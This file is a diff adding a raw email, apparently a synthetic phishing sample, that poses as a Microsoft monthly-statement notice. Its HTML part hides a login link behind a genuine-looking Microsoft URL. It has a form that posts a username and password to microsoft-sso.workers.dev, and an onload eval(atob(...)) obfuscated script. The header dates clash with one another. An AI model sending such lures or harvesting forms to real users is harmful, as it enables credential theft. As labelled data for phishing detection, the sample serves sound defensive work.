@@ -1,0 +1,31 @@
+From: notice@microsoft-sso.workers.dev
+To: victim22@example.com
+Subject: Monthly statement available [ref UC4FAB2]
+Date: Tue, 28 Mar 2002 12:19:00 -0500
+Message-ID: <phish-82-9acbf2a0-20c3-4e64-9122-f5393d7edc94@microsoft-sso.workers.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 20 Mar 2002 08:57:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 15 Mar 2002 13:11:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 06 Mar 2002 09:18:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 26 Mar 2002 06:40:00 -0500
+Return-Path: <notice@microsoft-sso.workers.dev>
+Reply-To: notice@microsoft-sso.workers.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=microsoft-sso.workers.dev; dkim=pass header.d=microsoft-sso.workers.dev; dmarc=pass header.from=microsoft-sso.workers.dev
+Received-SPF: pass (mx.example.com: domain of notice@microsoft-sso.workers.dev designates 192.0.2.22 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=microsoft-sso.workers.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-82-5adba9fd"
+
+--bnd-p-82-5adba9fd
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://microsoft-sso.workers.dev/statement/UC4FAB2
+
+Reference: UC4FAB2
+--bnd-p-82-5adba9fd
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://microsoft-sso.workers.dev/statement/UC4FAB2<br/><br/>Reference: UC4FAB2</p><p><a href="http://microsoft-sso.workers.dev/login">https://www.microsoft.com/signin</a></p><form action="http://microsoft-sso.workers.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-82-5adba9fd--
